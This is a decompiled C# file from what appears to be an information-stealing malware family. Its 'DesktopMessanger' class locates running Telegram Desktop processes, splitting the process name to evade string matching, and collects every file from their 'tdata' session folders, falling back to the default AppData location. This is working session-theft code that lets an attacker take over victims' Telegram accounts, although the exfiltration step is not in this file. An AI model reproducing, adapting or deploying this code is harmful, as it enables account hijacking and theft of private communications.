using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000020 RID: 32
public class DesktopMessanger : FileScanner
{
	// Token: 0x17000001 RID: 1
	// (get) Token: 0x060000B2 RID: 178 RVA: 0x00003843 File Offset: 0x00001A43
	// (set) Token: 0x060000B3 RID: 179 RVA: 0x0000384B File Offset: 0x00001A4B
	public List<string> PassedPaths { get; set; } = new List<string>();

	// Token: 0x060000B4 RID: 180 RVA: 0x00008508 File Offset: 0x00006708
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		string result = "Profile_Unknown";
		try
		{
			DirectoryInfo directory = fileInfo.Directory;
			string text = string.Empty;
			if (directory.Name != "tdata")
			{
				text = directory.FullName.Split(new string[]
				{
					"tdata"
				}, StringSplitOptions.RemoveEmptyEntries)[1];
			}
			return "Profile_" + scannerArg.Tag + (string.IsNullOrWhiteSpace(text) ? "" : ("\\" + text));
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x060000B5 RID: 181 RVA: 0x000085B0 File Offset: 0x000067B0
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			int num = 1;
			foreach (string fileName in SystemInfoHelper.GetProcessesByName("Tel", "egram.exe"))
			{
				try
				{
					list.Add(new FileScannerArg
					{
						Tag = num.ToString(),
						Pattern = new string(new char[]
						{
							'*'
						}),
						Directory = new FileInfo(fileName).Directory.FullName + "\\tdata",
						Recoursive = false
					});
					foreach (string text in Directory.GetDirectories(new FileInfo(fileName).Directory.FullName + "\\tdata"))
					{
						if (new DirectoryInfo(text).Name.Length == 16)
						{
							list.Add(new FileScannerArg
							{
								Tag = num.ToString(),
								Pattern = new string(new char[]
								{
									'*'
								}),
								Directory = text,
								Recoursive = false
							});
						}
					}
					num++;
				}
				catch (Exception)
				{
				}
			}
			if (list.Count == 0)
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
				list.Add(new FileScannerArg
				{
					Tag = num.ToString(),
					Pattern = new string(new char[]
					{
						'*'
					}),
					Directory = text2,
					Recoursive = false
				});
				foreach (string text3 in Directory.GetDirectories(text2))
				{
					if (new DirectoryInfo(text3).Name.Length == 16)
					{
						list.Add(new FileScannerArg
						{
							Tag = num.ToString(),
							Pattern = new string(new char[]
							{
								'*'
							}),
							Directory = text3,
							Recoursive = false
						});
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
